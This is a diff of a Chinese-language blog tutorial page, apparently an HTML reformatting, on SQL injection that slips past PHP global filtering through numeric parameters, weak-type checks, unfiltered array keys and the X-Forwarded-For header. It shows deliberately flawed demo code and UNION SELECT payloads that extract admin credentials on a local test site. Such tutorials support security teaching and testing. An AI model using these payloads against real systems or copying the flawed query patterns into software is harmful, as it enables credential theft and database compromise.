@@ -227,7 +227,9 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这种数字型的注入是全局防护的盲点，构造注入语句完全不需要单引号的支持，所以也就不存在转义了。例如我们直接构造获取管理员账户密码的<code>POC</code>：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int1.php?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p><a href="http://localhost/sqltest/mangdian/int1.php?id=-1" target="_blank" rel="noopener">http://localhost/sqltest/mangdian/int1.php?id=-1</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
 <p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042608966044842.png" alt></p>
 <h3 id="2-php弱类型语言-判断逻辑错误引发注入"><a href="#2-php弱类型语言-判断逻辑错误引发注入" class="headerlink" title="2.php弱类型语言,判断逻辑错误引发注入"></a>2.php弱类型语言,判断逻辑错误引发注入</h3><p>缺陷代码：</p>
 <p><code>int2.php</code>:</p>
@@ -257,7 +259,9 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当然前提是数字型的注入，这里特殊之处在于增加了个<code>if($id&lt;1)</code>的逻辑判断，但<code>PHP</code>弱类型语言在逻辑判断上<code>0&lt;1</code>和<code>0 union select 1&lt;1</code>是等价的，都返回<code>True</code>。所以构造获取管理员账户密码的<code>POC</code>：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int2.php?id<span class="token operator">=</span>0 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p><a href="http://localhost/sqltest/mangdian/int2.php?id=0" target="_blank" rel="noopener">http://localhost/sqltest/mangdian/int2.php?id=0</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
 <p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466043335552089282.png" alt></p>
 <h3 id="3-过程中不全是数字型，忘记加单引号"><a href="#3-过程中不全是数字型，忘记加单引号" class="headerlink" title="3.过程中不全是数字型，忘记加单引号"></a>3.过程中不全是数字型，忘记加单引号</h3><p>这种情况是在第一条<code>sql</code>语句里是有单引号保护的，紧接着第二条<code>sql</code>语句没有单引号保护引发的注入，缺陷的代码如下：</p>
 <p><code>int1.php</code>:</p>
@@ -287,7 +291,9 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>第一条<code>sql</code>语句有单引号保护，第二条<code>sql</code>语句没有了单引号保护从而可以进一步注入。构造获取管理员账户密码的<code>POC</code>：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int3.php?id<span class="token operator">=</span>0 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p><a href="http://localhost/sqltest/mangdian/int3.php?id=0" target="_blank" rel="noopener">http://localhost/sqltest/mangdian/int3.php?id=0</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
 <p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042751383037845.png" alt></p>
 <h2 id="0x04-数组类型，全局防护只过滤了value-key，未过滤代入查询"><a href="#0x04-数组类型，全局防护只过滤了value-key，未过滤代入查询" class="headerlink" title="0x04 数组类型，全局防护只过滤了value/key，未过滤代入查询"></a>0x04 数组类型，全局防护只过滤了value/key，未过滤代入查询</h2><p>全局防护的代码只对数组中的<code>vaule</code>进行了过滤，<code>key</code>未过滤引发注入，全局防护缺陷代码如下：</p>
 <p><code>commonnew.php</code>:</p>
@@ -345,12 +351,18 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>虽然查询语句中<code>WHERE id=&#39;&quot;.$key.&quot;&#39;</code>有单引号保护，但是全局防护代码就没过滤<code>key</code>就存在注入了，首先<code>POST</code>请求下：</p>
-<pre><code>http://localhost/sqltest/mangdian/array.php title[1]=news title</code></pre><p>发现可以获取正常内容：</p>
+<blockquote>
+<p><a href="http://localhost/sqltest/mangdian/array.php" target="_blank" rel="noopener">http://localhost/sqltest/mangdian/array.php</a> title[1]=news title</p>
+</blockquote>
+<p>发现可以获取正常内容：</p>
 <p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042891792035535.png" alt></p>
 <p><code>sql</code>语句为：</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> title<span class="token operator">=</span><span class="token string">'news title'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>构造获取管理员账户密码的<code>POST</code>请求：</p>
-<pre><code>http://localhost/sqltest/mangdian/array title[-1&#39; union select 1,2,concat(name,0x23,pass) from admin#]=news title</code></pre><p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042918853048462.png" alt></p>
+<blockquote>
+<p><a href="http://localhost/sqltest/mangdian/array" target="_blank" rel="noopener">http://localhost/sqltest/mangdian/array</a> title[-1’ union select 1,2,concat(name,0x23,pass) from admin#]=news title</p>
+</blockquote>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042918853048462.png" alt></p>
 <h2 id="0x05-SERVER变量未过滤"><a href="#0x05-SERVER变量未过滤" class="headerlink" title="0x05 SERVER变量未过滤"></a>0x05 SERVER变量未过滤</h2><p>上面的全局防护只过滤了<code>GET</code>、<code>POST</code>和<code>COOKIE</code>而忽略了<code>SERVER</code>变量，<code>SERVER</code>变量的注入常常发生在获取用户<code>ip</code>并入库的函数上，类似如下代码(在<code>common.php</code>中)：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//获取访问者IP（PHP代码/函数）    </span>
 <span class="token keyword">function</span> <span class="token function">get_ip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -393,7 +405,10 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里可以在请求中添加获取管理员账户密码的<code>POC</code>为:</p>
-<pre><code>X-Forwarded-For:-1&#39; union select 1,2,concat(name,0x23,pass) from admin#</code></pre><p>由于<code>SERVER</code>变量没过滤所以这里单引号保护也就没用了。成功获取管理员账户密码如下：</p>
+<blockquote>
+<p>X-Forwarded-For:-1’ union select 1,2,concat(name,0x23,pass) from admin#</p>
+</blockquote>
+<p>由于<code>SERVER</code>变量没过滤所以这里单引号保护也就没用了。成功获取管理员账户密码如下：</p>
 <p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466043009233042433.png" alt></p>
 </section>
     <!-- Tags START -->
